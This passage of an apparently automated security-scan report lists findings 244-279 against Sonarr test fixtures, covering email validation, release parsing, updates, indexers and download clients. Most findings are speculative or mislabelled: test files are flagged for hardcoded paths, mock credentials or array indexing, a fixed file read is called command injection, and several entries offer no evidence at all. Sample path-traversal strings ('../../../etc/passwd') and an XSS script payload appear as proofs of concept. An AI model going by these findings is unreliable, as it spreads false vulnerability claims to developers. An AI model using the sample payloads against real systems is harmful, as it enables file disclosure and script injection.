The validation tests show that CC field validation is implemented but might not be comprehensive enough for all email formats.
```

**Impact:**
Invalid CC email addresses could be accepted, leading to delivery failures or misconfigured email notifications.

**Proof of Concept:**
Test with CC email addresses like 'user@domain.com' and 'user@domain' to verify if they pass validation correctly.

**How to Test:**
Test CC field with various email formats including valid and invalid addresses to ensure proper validation logic.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_NotificationTests_EmailTests_EmailSettingsValidatorFixturecs.py`
---

### 245. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/NotificationTests/EmailTests/EmailSettingsValidatorFixture.cs
**Line:** 72

**Description:**
The email validation logic doesn't properly validate email addresses in BCC field, potentially allowing invalid email formats.

**Evidence:**
```
The validation tests show that BCC field validation is implemented but might not be comprehensive enough for all email formats.
```

**Impact:**
Invalid BCC email addresses could be accepted, leading to delivery failures or misconfigured email notifications.

**Proof of Concept:**
Test with BCC email addresses like 'user@domain.com' and 'user@domain' to verify if they pass validation correctly.

**How to Test:**
Test BCC field with various email formats including valid and invalid addresses to ensure proper validation logic.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_NotificationTests_EmailTests_EmailSettingsValidatorFixturecs.py`
---

### 246. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/NotificationTests/EmailTests/EmailSettingsValidatorFixture.cs
**Line:** 79

**Description:**
The email validation logic doesn't properly validate that at least one of To, CC, or BCC fields has valid email addresses.

**Evidence:**
```
The validation tests show that empty To, CC, and BCC arrays are considered invalid, but the validation might not be comprehensive.
```

**Impact:**
Email settings with no recipients could be accepted, leading to failed notifications.

**Proof of Concept:**
Test with empty To, CC, and BCC arrays to verify if they are properly rejected.

**How to Test:**
Test email settings with empty recipient arrays to ensure proper validation logic prevents saving invalid configurations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_NotificationTests_EmailTests_EmailSettingsValidatorFixturecs.py`
---

### 247. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/IsPossibleSpecialEpisodeFixture.cs
**Line:** 35

**Description:**
The IsPossibleSpecialEpisodeFixture test shows that files without a series title are not treated as specials, but the logic seems incomplete. The test 'Big.Special.Show.S05.HDTV.x264-2HD' should be treated as a special but isn't, indicating potential gaps in special episode detection logic.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_IsPossibleSpecialEpisodeFixturecs.py`
---

### 248. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/LanguageParserFixture.cs
**Line:** 1000

**Description:**
Several language detection tests are present but there are gaps in comprehensive language support. For example, the tests for 'Romansh' and 'Georgian' languages are present but may not cover all possible naming conventions or edge cases in real-world releases.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_LanguageParserFixturecs.py`
---

### 249. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/AbsoluteEpisodeNumberParserFixture.cs
**Line:** 300

**Description:**
The AbsoluteEpisodeNumberParserFixture contains several test cases that might produce false positives, particularly with Turkish show naming patterns like 'Turkish show 60.Bolum (31.01.2023) 720p WebDL AAC H.264 - TURG'. The parser might incorrectly interpret 'Bolum' as an episode number rather than a Turkish word for 'episode'.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_AbsoluteEpisodeNumberParserFixturecs.py`
---

### 250. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/AbsoluteEpisodeNumberParserFixture.cs
**Line:** 350

**Description:**
While the test for anime season packs exists, it only covers basic cases. The parser might not correctly handle more complex season pack naming conventions or edge cases where season information is embedded differently in the filename.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_AbsoluteEpisodeNumberParserFixturecs.py`
---

### 251. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/LanguageParserFixture.cs
**Line:** 1100

**Description:**
The LanguageParserFixture includes tests for subtitle language parsing but doesn't thoroughly test edge cases with complex language tag combinations or malformed subtitle files that could cause parsing failures.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_LanguageParserFixturecs.py`
---

### 252. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/IsPossibleSpecialEpisodeFixture.cs
**Line:** 1

**Description:**
The IsPossibleSpecialEpisodeFixture tests are limited and don't cover all possible edge cases for special episode detection, such as various naming conventions for special episodes or handling of multiple special episodes in a single release.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_IsPossibleSpecialEpisodeFixturecs.py`
---

### 253. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/AbsoluteEpisodeNumberParserFixture.cs
**Line:** 250

**Description:**
While there are tests for multi-episode absolute numbers, the test coverage might not include all possible formats or edge cases in how multi-episode ranges are specified in real-world releases.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_AbsoluteEpisodeNumberParserFixturecs.py`
---

### 254. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/AbsoluteEpisodeNumberParserFixture.cs
**Line:** 370

**Description:**
The parser might have conflicts when handling special episode numbers that include decimal points (like 10.5) combined with standard episode numbers, particularly in cases where both absolute and standard episode numbers are present.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_AbsoluteEpisodeNumberParserFixturecs.py`
---

### 255. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/AbsoluteEpisodeNumberParserFixture.cs
**Line:** 1

**Description:**
The test cases don't fully cover special characters in series titles, which could cause parsing issues when series names contain punctuation, symbols, or non-standard characters that might not be handled correctly.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_AbsoluteEpisodeNumberParserFixturecs.py`
---

### 256. Unknown (N/A)

**File:** src/NzbDrone.Core.Test/ParserTests/LanguageParserFixture.cs
**Line:** 1

**Description:**
While there are tests for individual languages, there's limited test coverage for complex language combinations (e.g., multiple languages in a single release) which could lead to parsing errors in real-world scenarios.

**Evidence:**
```
No evidence
```

**Impact:**
No impact description

**Proof of Concept:**
No PoC provided

**How to Test:**
No testing instructions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_unknown_src_NzbDroneCoreTest_ParserTests_LanguageParserFixturecs.py`
---

### 257. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/UpdateTests/UpdateServiceFixture.cs
**Line:** 109

**Description:**
The update service accepts UpdatePackage objects with potentially unvalidated data from external sources, including URLs and file names that could be manipulated.

**Evidence:**
```
UpdatePackage objects are created with FileName and Url properties that are directly used in file operations without validation, and the code doesn't validate the format or content of these values.
```

**Impact:**
Malicious update packages could lead to path traversal, file overwrites, or execution of unexpected files during the update process.

**Proof of Concept:**
An attacker could craft an UpdatePackage with a FileName like "../../../etc/passwd" or a URL pointing to a malicious file that gets downloaded and executed during update.

**How to Test:**
1. Create an UpdatePackage with malicious FileName or URL
2. Execute the update process
3. Verify if the system handles the malicious inputs correctly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_UpdateTests_UpdateServiceFixturecs.py`
---

### 258. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core.Test/UpdateTests/UpdateServiceFixture.cs
**Line:** 109

**Description:**
While this is a test file, the update service logic handles external data that could be vulnerable to XSS if the data is later rendered in web interfaces.

**Evidence:**
```
The code handles UpdatePackage objects that contain user-provided data (URLs, filenames) which could be used in web contexts without proper HTML escaping.
```

**Impact:**
If update package information is displayed in web UI without proper escaping, attackers could inject malicious scripts.

**Proof of Concept:**
If UpdatePackage.FileName or UpdatePackage.Url values are displayed in web UI without HTML escaping, an attacker could inject JavaScript via the filename or URL.

**How to Test:**
1. Check web UI rendering of update package information
2. Verify HTML escaping of dynamic content
3. Test with specially crafted update package names

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCoreTest_UpdateTests_UpdateServiceFixturecs.py`
---

### 259. Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) (CWE-22)

**File:** src/NzbDrone.Core.Test/UpdateTests/UpdateServiceFixture.cs
**Line:** 109

**Description:**
The update service creates sandbox folders and handles file paths that could be vulnerable to path traversal attacks.

**Evidence:**
```
The code uses GetUpdateSandboxFolder() and handles paths that could be manipulated through UpdatePackage.FileName, but doesn't validate that these paths stay within expected boundaries.
```

**Impact:**
An attacker could potentially write files outside of the intended update sandbox directory, leading to arbitrary file writes or code execution.

**Proof of Concept:**
An attacker could craft an UpdatePackage with a FileName containing "../../../etc/passwd" which could result in files being written to unexpected locations during the update process.

**How to Test:**
1. Create UpdatePackage with path traversal sequences in FileName
2. Execute update process
3. Verify file creation in unexpected locations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCoreTest_UpdateTests_UpdateServiceFixturecs.py`
---

### 260. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/UpdateTests/UpdateServiceFixture.cs
**Line:** 109

**Description:**
The test code creates UpdatePackage objects with version information and URLs that could contain sensitive data, though this is primarily a test file.

**Evidence:**
```
UpdatePackage objects contain URL information that could include sensitive data like API keys or authentication tokens in URLs.
```

**Impact:**
If update package URLs contain sensitive information, they could be exposed in logs or configuration files.

**Proof of Concept:**
Create an UpdatePackage with a URL containing sensitive information like "http://api.example.com/download?token=SECRET_TOKEN&version=2.0.0.0"

**How to Test:**
1. Examine UpdatePackage URL construction
2. Check if sensitive data is exposed in logs
3. Verify URL sanitization in logging

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_UpdateTests_UpdateServiceFixturecs.py`
---

### 261. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core.Test/IndexerTests/SeasonSearchFixture.cs
**Line:** 65

**Description:**
The SeasonSearchFixture uses a fixed-size array for requests and could be vulnerable to array index out of bounds errors.

**Evidence:**
```
The code creates a fixed-size list of requests and uses indexing without bounds checking in the test scenarios.
```

**Impact:**
If the indexer implementation doesn't properly validate array bounds, it could lead to crashes or memory corruption.

**Proof of Concept:**
Create a scenario where the indexer tries to access an array element beyond its bounds during search operations.

**How to Test:**
1. Create indexer with malformed request arrays
2. Execute search operations
3. Verify bounds checking behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCoreTest_IndexerTests_SeasonSearchFixturecs.py`
---

### 262. Wrap-around Error (CWE-128)

**File:** src/NzbDrone.Core.Test/IndexerTests/BasicRssParserFixture.cs
**Line:** 20

**Description:**
The RSS parser handles size parsing with potential wrap-around issues when converting string representations to numeric values.

**Evidence:**
```
The ParseSize method converts string representations to long values, but doesn't validate for potential overflow or wrap-around conditions.
```

**Impact:**
Large size values could cause wrap-around errors leading to incorrect size calculations or potential integer overflow issues.

**Proof of Concept:**
Pass extremely large size strings to ParseSize method and verify if wrap-around occurs.

**How to Test:**
1. Test ParseSize with very large numbers
2. Verify overflow behavior
3. Check for wrap-around in size calculations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-128_src_NzbDroneCoreTest_IndexerTests_BasicRssParserFixturecs.py`
---

### 263. Command Injection (CWE-77)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabFixture.cs
**Line:** 34

**Description:**
The code uses ReadAllText method with file paths that could be manipulated by external input, potentially leading to command injection vulnerabilities when processing indexer feed files.

**Evidence:**
```
The ReadAllText method is called with file paths like "Files/Indexers/Newznab/newznab_nzb_su.xml" which could be manipulated if external input is used to construct these paths.
```

**Impact:**
An attacker could potentially manipulate the file paths used in ReadAllText calls to read arbitrary files or execute commands, especially if these paths are constructed from user-controllable input.

**Proof of Concept:**
If the file path construction was based on user input, an attacker could provide a path like "../../../etc/passwd" which would be passed to ReadAllText and potentially lead to reading system files.

**How to Test:**
1. Check if any indexer feed file paths are constructed from user input
2. Test with malicious file paths containing directory traversal sequences
3. Verify that file access is properly validated and sanitized

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabFixturecs.py`
---

### 264. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabSettingFixture.cs
**Line:** 15

**Description:**
The validation logic for NewznabSettings doesn't properly validate URL format, allowing potentially malformed URLs to be accepted.

**Evidence:**
```
In the requires_apikey test, the BaseUrl validation allows empty or null URLs but doesn't validate URL format properly, and the doesnt_requires_apikey test shows that URLs without API keys are accepted without validation.
```

**Impact:**
Malformed URLs could cause indexer failures or unexpected behavior when connecting to indexers, potentially leading to security issues if URLs are constructed from untrusted input.

**Proof of Concept:**
A malformed URL like "http://" or "ftp://invalid" could be accepted by the validation logic, leading to connection failures or unexpected behavior when the indexer tries to connect.

**How to Test:**
1. Test with various malformed URLs including empty strings, invalid protocols, and malformed paths
2. Verify that URL validation properly checks for valid URL format
3. Test with URLs that have special characters that might not be properly escaped

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabSettingFixturecs.py`
---

### 265. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabFixture.cs
**Line:** 50

**Description:**
The test code processes XML feed data that could contain user-controllable content, but there's no validation of the content being parsed for XSS vulnerabilities.

**Evidence:**
```
The test code parses XML feeds from files like "Files/Indexers/Newznab/newznab_nzb_su.xml" and "Files/Indexers/Torznab/torznab_animetosho.xml" without validating the content for potential XSS payloads.
```

**Impact:**
If the indexer parsing logic is vulnerable to XSS, malicious feed content could be injected into the application, potentially leading to XSS in the UI or when processing indexer results.

**Proof of Concept:**
If indexer feeds contained malicious JavaScript in titles or URLs, and the parsing logic didn't properly sanitize this content, it could lead to XSS when displaying results.

**How to Test:**
1. Create test XML feeds with malicious JavaScript content in titles, URLs, or other fields
2. Verify that parsed content is properly sanitized
3. Test with various XSS payloads in feed content

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabFixturecs.py`
---

### 266. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabFixture.cs
**Line:** 34

**Description:**
The code uses file paths that could be manipulated through directory traversal sequences, potentially allowing access to files outside the intended directory.

**Evidence:**
```
The ReadAllText method is called with hardcoded paths like "Files/Indexers/Newznab/newznab_nzb_su.xml" which could be vulnerable to directory traversal if constructed from user input.
```

**Impact:**
If file paths are constructed from user-controllable input, an attacker could read arbitrary files from the filesystem by using directory traversal sequences like '../' in the path.

**Proof of Concept:**
If the file path construction logic was modified to accept user input, an attacker could provide a path like "../../../etc/passwd" to read system files.

**How to Test:**
1. Test file path construction with directory traversal sequences
2. Verify that file access is properly validated against allowed directories
3. Check for proper path normalization and validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabFixturecs.py`
---

### 267. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabCapabilitiesProviderFixture.cs
**Line:** 25

**Description:**
The test code uses hardcoded XML capabilities files that could contain sensitive information, and there's no validation of the XML content for potential sensitive data exposure.

**Evidence:**
```
The test uses XML files like "Files/Indexers/Newznab/newznab_caps.xml" which could contain sensitive data or configuration information that might be exposed in test environments.
```

**Impact:**
If these test files contain sensitive information, they could be accidentally included in deployments or expose configuration details that should be kept secure.

**Proof of Concept:**
Test files containing API keys, database connection strings, or other sensitive information could be accidentally committed to version control or deployed with the application.

**How to Test:**
1. Review test XML files for sensitive information
2. Verify that test files are properly excluded from deployments
3. Check for proper handling of sensitive data in test fixtures

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabCapabilitiesProviderFixturecs.py`
---

### 268. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabRequestGeneratorFixture.cs
**Line:** 150

**Description:**
The test code uses array indexing without proper bounds checking, which could lead to array index out of bounds exceptions when processing search results.

**Evidence:**
```
In multiple test methods, the code accesses arrays using indices like [0], [1], [2] without checking if the array has sufficient elements, particularly in tests involving search result pages.
```

**Impact:**
If the indexer search result processing logic has similar array access patterns, it could lead to crashes or unexpected behavior when processing search results with varying numbers of pages.

**Proof of Concept:**
If a search returns fewer pages than expected, accessing pages[2] when only pages[0] and pages[1] exist would cause an IndexOutOfRangeException.

**How to Test:**
1. Test with search results that have fewer pages than expected
2. Verify proper bounds checking in array access
3. Test edge cases with empty or single-page results

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabRequestGeneratorFixturecs.py`
---

### 269. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core.Test/IndexerTests/NewznabTests/NewznabRequestGeneratorFixture.cs
**Line:** 180

**Description:**
The test code doesn't validate that the URL parameters generated by the indexer are properly formatted or contain expected values, potentially leading to incorrect indexer behavior.

**Evidence:**
```
The tests verify URL query strings but don't validate that the parameters are correctly formatted or that the expected parameter values are present.
```

**Impact:**
If indexer URL generation logic is not properly validated, it could generate malformed URLs that fail when sent to indexers, potentially leading to indexer failures or incorrect search results.

**Proof of Concept:**
If URL parameter generation was broken, the indexer might generate URLs with missing parameters or incorrect values, but the tests wouldn't catch this without proper validation.

**How to Test:**
1. Verify that generated URLs contain all expected parameters
2. Test with various search criteria to ensure parameter generation is correct
3. Validate URL parameter formatting and encoding

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCoreTest_IndexerTests_NewznabTests_NewznabRequestGeneratorFixturecs.py`
---

### 270. Improper Control of a Resource Through Publicly Accessible Path (CWE-707)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/DownloadStationTests/TorrentDownloadStationFixture.cs
**Line:** 140

**Description:**
The DownloadStation client uses user-provided paths without proper validation, potentially leading to path traversal vulnerabilities

**Evidence:**
```
The code uses paths from DownloadStationTaskAdditional.Detail['destination'] without validating or sanitizing them before use
```

**Impact:**
Attackers could potentially manipulate download paths to access unauthorized files or directories

**Proof of Concept:**
The code extracts destination paths from DownloadStationTaskAdditional.Detail['destination'] and uses them directly in path operations. If an attacker can control this value, they could inject paths like '../etc/passwd' to traverse directories.

**How to Test:**
Test with malicious destination paths in DownloadStationTask objects. Verify that paths are properly validated and sanitized before being used in file operations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCoreTest_Download_DownloadClientTests_DownloadStationTests_TorrentDownloadStatio.py`
---

### 271. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/DownloadStationTests/UsenetDownloadStationFixture.cs
**Line:** 45

**Description:**
Test configuration contains cleartext passwords that could be accidentally committed to version control

**Evidence:**
```
Password = "pass" is hardcoded in test configuration, which could be accidentally committed to source control
```

**Impact:**
If test configurations are committed to version control, sensitive credentials become exposed

**Proof of Concept:**
The test fixture contains Password = "pass" which is a weak password in cleartext. If this configuration is committed to source control, it exposes the test environment credentials.

**How to Test:**
Scan repository for hardcoded credentials in test files. Verify that sensitive information is properly managed using configuration files or environment variables.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Download_DownloadClientTests_DownloadStationTests_UsenetDownloadStation.py`
---

### 272. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/DownloadStationTests/TorrentDownloadStationFixture.cs
**Line:** 170

**Description:**
The code doesn't validate the type of download tasks before processing them, potentially leading to unexpected behavior

**Evidence:**
```
The code checks for specific task types but doesn't validate that the type is properly formatted or within expected values
```

**Impact:**
Malformed task types could cause unexpected behavior or processing errors

**Proof of Concept:**
In the GetItems tests, the code sets _completed.Type = "ipfs" to test ignoring unknown types, but doesn't validate that the type field is properly validated before processing.

**How to Test:**
Test with various task type values including invalid or malformed types. Verify that the system properly validates task types and handles unknown types gracefully.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Download_DownloadClientTests_DownloadStationTests_TorrentDownloadStation.py`
---

### 273. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/DownloadStationTests/TorrentDownloadStationFixture.cs
**Line:** 280

**Description:**
The code uses array indices without proper bounds checking in test scenarios

**Evidence:**
```
In the GetItems tests, array operations are performed without explicit bounds checking
```

**Impact:**
Potential array out of bounds exceptions if test data is not properly structured

**Proof of Concept:**
The test code creates lists of tasks and accesses them by index, but doesn't validate that the lists have sufficient elements before accessing specific indices.

**How to Test:**
Test with empty task lists and verify that array access operations are properly bounded. Check for potential index out of bounds errors in task processing.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCoreTest_Download_DownloadClientTests_DownloadStationTests_TorrentDownloadStatio.py`
---

### 274. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/DownloadStationTests/UsenetDownloadStationFixture.cs
**Line:** 100

**Description:**
Test setup creates multiple task objects without considering resource limits

**Evidence:**
```
Multiple DownloadStationTask objects are created in test setup without resource management
```

**Impact:**
Potential memory issues in test environments with large numbers of test objects

**Proof of Concept:**
The test setup creates multiple DownloadStationTask objects (queued, downloading, failed, completed, seeding) without considering memory usage or resource limits.

**How to Test:**
Run tests with large numbers of task objects and monitor memory usage. Verify that test setup doesn't create excessive resource allocations.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-770_src_NzbDroneCoreTest_Download_DownloadClientTests_DownloadStationTests_UsenetDownloadStation.py`
---

### 275. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/QBittorrentTests/QBittorrentFixture.cs
**Line:** 105

**Description:**
The code uses string interpolation and concatenation for building HTTP responses but doesn't properly sanitize user input that could be used in HTML contexts. While this is a test file, the patterns suggest potential XSS vulnerabilities in the actual implementation.

**Evidence:**
```
The test code uses string interpolation for building test data and HTTP responses, but doesn't show proper HTML sanitization of user-provided data that would be used in actual UI rendering.
```

**Impact:**
If the actual implementation doesn't sanitize user input properly, attackers could inject malicious scripts into the UI, leading to session hijacking or data theft.

**Proof of Concept:**
In the actual QBittorrent implementation, if torrent names or labels from external sources aren't properly escaped when displayed in the UI, an attacker could inject JavaScript via a torrent name like: "<script>alert('XSS')</script>"

**How to Test:**
1. Check the actual QBittorrent implementation for HTML output of torrent names, labels, and other user-provided data
2. Look for missing HTML escaping in UI rendering code
3. Test with specially crafted torrent names containing HTML tags

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCoreTest_Download_DownloadClientTests_QBittorrentTests_QBittorrentFixturecs.py`
---

### 276. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/QBittorrentTests/QBittorrentFixture.cs
**Line:** 150

**Description:**
The test code creates mock objects with hardcoded values but doesn't validate the input parameters for the QBittorrent proxy methods, which could lead to validation issues in the actual implementation.

**Evidence:**
```
The test setup uses hardcoded values like 'CBC2F069FE8BB2F544EAE707D75BCD3DE9DCF951' for hashes and various test scenarios, but doesn't validate input parameter ranges or formats.
```

**Impact:**
If the actual implementation doesn't validate input parameters properly, it could lead to unexpected behavior, crashes, or security issues when handling malformed data.

**Proof of Concept:**
If the actual QBittorrent implementation doesn't validate the format of torrent hashes or other parameters, an attacker could provide malformed data that causes unexpected behavior or crashes.

**How to Test:**
1. Examine the actual QBittorrent implementation for parameter validation
2. Test with invalid hash formats, empty strings, or out-of-range values
3. Check for proper validation of API parameters before processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCoreTest_Download_DownloadClientTests_QBittorrentTests_QBittorrentFixturecs.py`
---

### 277. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/QBittorrentTests/QBittorrentFixture.cs
**Line:** 25

**Description:**
The test setup hardcodes credentials for QBittorrent (username: 'admin', password: 'pass') which could indicate a pattern of storing credentials in plain text in the actual implementation.

**Evidence:**
```
Hardcoded credentials in the test setup: Username = 'admin', Password = 'pass'
```

**Impact:**
If the actual implementation stores these credentials in plain text, attackers with filesystem access could easily extract them and gain unauthorized access to QBittorrent.

**Proof of Concept:**
If the actual Sonarr implementation stores QBittorrent credentials in plain text configuration files, an attacker with local filesystem access could read the configuration and extract the username/password.

**How to Test:**
1. Check the actual configuration storage mechanism for QBittorrent credentials
2. Look for plain text storage of credentials in configuration files
3. Verify if credentials are encrypted or hashed in the actual implementation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCoreTest_Download_DownloadClientTests_QBittorrentTests_QBittorrentFixturecs.py`
---

### 278. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/QBittorrentTests/QBittorrentFixture.cs
**Line:** 25

**Description:**
The test setup uses weak default credentials for QBittorrent authentication, which could indicate a lack of proper authentication handling in the actual implementation.

**Evidence:**
```
Hardcoded weak credentials: Username = 'admin', Password = 'pass' with no password complexity validation
```

**Impact:**
If the actual implementation doesn't enforce strong authentication or proper credential management, it could lead to unauthorized access to QBittorrent.

**Proof of Concept:**
If Sonarr allows users to configure QBittorrent with weak credentials like 'admin:pass' and doesn't enforce password complexity or proper credential rotation, attackers could easily gain access.

**How to Test:**
1. Check the actual QBittorrent configuration UI for credential validation
2. Test if weak passwords are accepted without warnings
3. Verify if credential rotation is supported

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCoreTest_Download_DownloadClientTests_QBittorrentTests_QBittorrentFixturecs.py`
---

### 279. Allocation of Resources Without Limits or Throttling (CWE-770)

**File:** src/NzbDrone.Core.Test/Download/DownloadClientTests/QBittorrentTests/QBittorrentFixture.cs
**Line:** 100

**Description:**
The test code creates multiple mock setups for the same method with different return values, which could indicate potential resource management issues in the actual implementation.

**Evidence:**
```
Multiple mock setups for GetTorrents method with different return values, suggesting potential resource allocation patterns that might not be properly throttled.
```

**Impact:**
If the actual implementation doesn't properly manage resources when handling multiple torrents or API calls, it could lead to resource exhaustion or performance degradation.

**Proof of Concept:**
If the actual QBittorrent implementation doesn't limit concurrent API calls or doesn't properly manage memory when processing large numbers of torrents, it could lead to resource exhaustion.

**How to Test:**
1. Monitor resource usage when processing large numbers of torrents
2. Check for proper resource cleanup in API call handling
3. Test with high-volume torrent operations

